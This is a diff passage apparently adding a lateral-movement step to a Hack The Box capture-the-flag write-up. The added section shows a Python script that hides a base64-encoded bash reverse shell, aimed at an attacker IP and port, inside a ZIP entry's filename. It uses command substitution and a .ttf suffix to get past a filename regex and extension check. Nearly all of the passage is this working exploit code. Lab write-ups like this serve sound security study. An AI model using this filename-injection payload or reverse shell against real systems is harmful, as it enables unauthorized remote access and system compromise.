@@ -1794,6 +1794,31 @@ This script demonstrates that the server environment is configured to run Python
 ### 4.3 Lateral Movement
 
 To bypass the script's strict filename regex (`SAFE_NAME_REGEX`), create a malicious ZIP file locally.
+
+```shell
+                                                                                                                                  
+┌──(kali㉿kali)-[~/PUEMAN/HTB/SN10/VariaType]
+└─$ cat exploit.py              
+import zipfile
+
+# Your Kali IP and a new port for the Steve shell
+ip = "10.10.14.71"
+port = "4445"
+
+# The bash payload, base64 encoded to avoid character issues
+payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
+import base64
+b64_payload = base64.b64encode(payload.encode()).decode()
+
+# The filename uses command substitution: $(echo <b64> | base64 -d | bash)
+# We add .ttf at the end so it passes the script's extension check
+exploit_filename = f"$(echo {b64_payload}|base64 -d|bash).ttf"
+
+with zipfile.ZipFile('exploit.zip', 'w') as zipf:
+    zipf.writestr(exploit_filename, "dummy content")
+
+print(f"Created exploit.zip with filename: {exploit_filename}")
+```
 <div align="center">
 <br>
 <br>
